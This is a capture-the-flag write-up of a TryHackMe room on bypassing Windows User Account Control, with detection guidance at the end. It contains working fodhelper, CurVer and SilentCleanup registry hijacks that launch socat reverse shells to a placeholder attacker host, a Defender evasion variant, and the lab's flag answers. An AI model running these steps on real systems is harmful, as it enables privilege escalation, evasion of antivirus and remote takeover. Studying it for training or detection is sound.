# TryHackMe — Bypassing UAC
Windows Privilege Escalation | Post-Exploitation

This room covers how to bypass User Account Control (UAC) on Windows — the mechanism that forces processes to run with a low-privilege token by default, even when launched by an administrator. The interesting part isn't just the exploits themselves, it's *why* they work: Microsoft doesn't treat UAC as a security boundary, just a convenience feature, which means most of these bypasses are known, documented, and still unpatched.

> **Category:** Windows Privilege Escalation  
> **Difficulty:** Medium  
> **Platform:** TryHackMe

---
## Task 1 — Introduction

UAC is a security feature that forces every new process to run with a low-privilege token by default, regardless of whether it was launched by a standard user or an administrator. The interesting bit going in: Microsoft doesn't actually classify UAC as a security boundary, just a convenience mechanism — which is why most of the bypasses in this room are publicly known and still work on unpatched systems.


---

## Task 2 — User Account Control (UAC)

Every process on Windows carries an **Integrity Level (IL)** as part of Mandatory Integrity Control (MIC). MIC is checked *before* the standard DACL, so having the right permissions on paper doesn't help if your IL is too low.

The four levels, low to high:

- **Low** — internet-facing processes (e.g. IE), almost no permissions
- **Medium** — standard users, and admins' filtered tokens
- **High** — admins' elevated tokens (or all admin tokens if UAC is disabled)
- **System** — reserved for the OS

The part that catches people out: administrators get **two** tokens at logon, not one. A **filtered token** at Medium IL for everyday use, and an **elevated token** at High IL that only gets attached once the user clicks through the UAC prompt. So even landing a shell as a local admin usually means sitting at Medium IL — confirmed with:

```
whoami /groups | find "Label"
```

If it shows `Mandatory Label\Medium Mandatory Level`, you're on the filtered token, and admin-only actions like `net user /add` will fail with `Access is denied`.

Elevation itself is brokered by the **Application Information Service (Appinfo)**. A request to run something elevated goes to Appinfo, which checks the target's manifest for auto-elevate eligibility, then — if interactive approval is needed — launches `consent.exe` on a secure desktop. Once approved, Appinfo runs the process with the elevated token and re-parents it back to the calling shell.

UAC's notification levels matter less than expected — the bottom three settings are functionally identical to an attacker. Only **Always Notify** changes anything, since it forces a prompt even for auto-elevating binaries, which shuts down most of the tricks later in this room.

**Answer the questions below**

**What is the highest integrity level (IL) available on Windows?**
`System`

**What is the IL associated with an administrator's elevated token?**
`High`

**What is the full name of the service in charge of dealing with UAC elevation requests?**
`Application Information Service`

---

## Task 3 — UAC: GUI based bypasses

Some signed Microsoft binaries living in trusted paths (`System32`, `Program Files`) are allowed to **auto-elevate** — run at High IL without ever showing a UAC prompt. You can confirm this on a given binary with Sysinternals `sigcheck`:

```
sigcheck64.exe -m c:\windows\system32\msconfig.exe
```

which shows `<autoElevate>true</autoElevate>` right in the manifest.

### Case study: msconfig.exe

Open `msconfig`, check it in Process Hacker, and it's already running at High IL despite no prompt ever appearing. It also happens to have a built-in way to spawn a shell — under the **Tools** tab there's a "Launch" option that opens `cmd.exe`. Since that shell is spawned from msconfig's process, it inherits the same High IL token.

```
C:\> C:\flags\GetFlag-msconfig.exe
```

### Case study: azman.msc

`azman.msc` (Authorization Manager) auto-elevates the same way — all `.msc` snap-ins run through `mmc.exe` — but it doesn't have an obvious built-in shell. The workaround: open the Help menu, right-click anywhere in the help content, and select **View Source**, which spawns Notepad. From Notepad, go to **File > Open**, switch the file type filter to "All Files", browse to `C:\Windows\System32`, find `cmd.exe`, and **right-click > Open** instead of double-clicking. That `cmd.exe` inherits the High IL token from the `mmc.exe` process tree — visible in Process Hacker's process tree view.

```
C:\> C:\flags\GetFlag-azman.exe
```

**Questions**

**Q1. What flag is returned by running the `msconfig` exploit?**

**Answer:** `THM{UAC_HELLO_WORLD}`

---

**Q2. What flag is returned by running the `azman.msc` exploit?**

**Answer:** `THM{GUI_UAC_BYPASSED_AGAIN}`

---

## Task 4 — UAC: Auto-Elevating Processes

To auto-elevate, a Windows executable generally needs to be signed by the Windows Publisher, live in a trusted directory, and either declare the `autoElevate` manifest element, be on Microsoft's internal auto-elevate allowlist, or be an `.msc` snap-in hosted by `mmc.exe`.

### Fodhelper

`fodhelper.exe` (Windows optional features manager) auto-elevates, and unlike msconfig/azman, it can be abused **without any GUI access** — which makes it viable from a plain remote shell. This technique has been used in the wild by the Glupteba malware family.

The root cause is how `fodhelper` resolves its command: through the `ms-settings` ProgID in the registry. `HKEY_CLASSES_ROOT` is a merge of two paths — `HKLM\Software\Classes` (system-wide) and `HKCU\Software\Classes` (per-user) — and **HKCU takes priority** if both exist. That means any unprivileged user can plant a per-user override for `ms-settings` and control what fodhelper actually runs, no HKLM write access needed.

From a Medium IL shell, already a member of Administrators, default UAC settings:

```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f

fodhelper.exe
```

The empty `DelegateExecute` value is required — without it, Windows ignores the hijacked command and falls back to the default association.

Catch the shell on the listener, confirm the IL:

```
whoami /groups | find "Label"
Mandatory Label\High Mandatory Level
```

Cleanup before continuing:

```cmd
reg delete HKCU\Software\Classes\ms-settings\ /f
```
**Questions**

**What flag is returned by running the fodhelper exploit?**

**Answer:** `THM{AUTOELEVATE4THEWIN}`

---

## Task 5 — UAC: Improving the Fodhelper Exploit to Bypass Windows Defender

With Windows Defender enabled, the exploit above gets caught almost immediately. The moment the registry value is set, a Defender notification pops up flagging a UAC bypass attempt via registry modification, and querying the key afterward shows it's already been wiped:

```
reg query %REG_KEY% /v ""
(Default)    REG_SZ    (value not set)
```

### Attempt 1 — racing Defender

Chaining the reg write with an immediate query shows the command is briefly written intact before Defender remediates it a moment later:

```cmd
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
```

So the natural next step is to run `fodhelper.exe` immediately after setting the key, betting on winning the race before Defender acts:

```cmd
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

This sometimes works, but it's unreliable — pure timing luck — and Defender still raises the alert regardless of whether the payload executed. Not something to depend on.

### Attempt 2 — CurVer indirection

A better approach, proposed by **@V3ded**, avoids writing to the `ms-settings` command path directly. Instead, it uses the `CurVer` registry entry, which Windows normally uses to point a file type at the "current version" of an application:

1. Create a **new, arbitrarily named ProgID** with its own payload under `Shell\Open\command`.
2. Point `ms-settings\CurVer` at that new ProgID.

When fodhelper opens `ms-settings`, it follows the `CurVer` redirection to the new ProgID and uses its associated command — meaning the payload no longer has to sit in a location Defender is specifically watching.

PowerShell version (still gets flagged by Defender):

```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

Translate the exact same logic into plain `cmd.exe`, though, and Defender doesn't alert at all — the detection was written against the published PowerShell PoC, not the underlying technique:

```cmd
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
```

```
whoami /groups | find "Label"
Mandatory Label\High Mandatory Level
```

Cleanup:

```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
**Questions**

**What flag is returned by running the fodhelper-curver exploit?**

**Answer:** `THM{AV_UAC_BYPASS_4_ALL}`
---

## Task 6 — UAC: Environment Variable Expansion

Every bypass so far relies on auto-elevating binaries, which stop working once UAC is set to **Always Notify** — fodhelper and similar apps would then require the user to go through the prompt like anything else. Scheduled tasks sidestep this entirely, since by design they run without user interaction independent of the UAC level.

### Case study: Disk Cleanup scheduled task

The target is `\Microsoft\Windows\DiskCleanup\SilentCleanup`. Checking it in Task Scheduler shows it's configured to run as the **Users** account (inherits the calling user's context) with **"Run with highest privileges"** enabled — for an administrator, that means it grabs the High IL elevated token automatically, no prompt involved. For a non-admin user, this same task would only run at Medium IL, since that's the highest token available to them, which is why this specific technique only works for accounts already in the Administrators group.

Its configured action:

```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Since that command depends on environment variable expansion, and `%windir%` can be overridden per-user via `HKCU\Environment`, the whole command can be hijacked:

```
"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "
```

The trailing `&REM ` comments out whatever the original command expands to after `%windir%`, so only the payload actually runs:

```
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Putting it together, from the backdoor shell:

```cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

```
whoami /groups | find "Label"
Mandatory Label\High Mandatory Level
```

Cleanup — **don't skip this one**, since a lot of Windows components depend on `%windir%` and will break until it's reverted:

```cmd
reg delete "HKCU\Environment" /v "windir" /f
```
**Questions**

**What flag is returned by running the DiskCleanup exploit?**

**Answer:** `THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}`

---

## Task 7 — Automated Exploitation

[UACME](https://github.com/hfiref0x/UACME) by @hfiref0x packages most known UAC bypasses into a single tool. Its `Akagi` component runs a given bypass by method number:

```cmd
cd C:\tools
UACME-Akagi64.exe 33
```

The techniques covered in this room map to:

| Method ID | Technique |
|---|---|
| 33 | fodhelper.exe (direct registry hijack) |
| 34 | DiskCleanup scheduled task |
| 70 | fodhelper.exe via CurVer registry key |

Handy for quickly checking whether a technique still works on a given build, but running it unmodified against a real target is trivially signatured by any modern AV/EDR. Knowing the manual steps behind each method is what actually lets you build a variant that survives contact with real defenses — as shown in Task 5.

No questions in this task.

---

## Task 8 — Conclusion

UAC bypasses keep coming back to the same two root causes: auto-elevating binaries that trust their environment more than they should, and per-user registry precedence (`HKCU` beating `HKLM`) that lets a low-privilege process redirect what a high-privilege one actually runs. Since Microsoft doesn't treat this as a patchable security boundary, none of it is going away — which makes detection engineering, not patching, the realistic long-term mitigation.

A few things that would actually catch this on a monitored host:

- Set UAC to **Always Notify** — kills the fodhelper-class bypasses outright.
- Sysmon Event ID 13 (registry value set) on writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` or `ms-settings\CurVer`, correlated with a child process of `fodhelper.exe`.
- Alert on writes to `HKCU\Environment`, especially `windir` — normal users never touch this key.
- Flag manual/on-demand execution of `SilentCleanup` outside its normal scheduled trigger.
- Watch for `cmd.exe` or `powershell.exe` spawned as a child of `fodhelper.exe`, `mmc.exe`, or `cleanmgr.exe` — none of these should normally spawn an interactive shell.
- Don't lean purely on static signatures — Task 5 showed that swapping PowerShell for `cmd.exe` alone was enough to slip past Defender. Registry location and process lineage hold up far better than payload content.

No questions in this task.

---

## MITRE ATT&CK mapping

- **T1548.002** — Abuse Elevation Control Mechanism: Bypass User Account Control
- **T1053.005** — Scheduled Task/Job: Scheduled Task (DiskCleanup abuse)

---
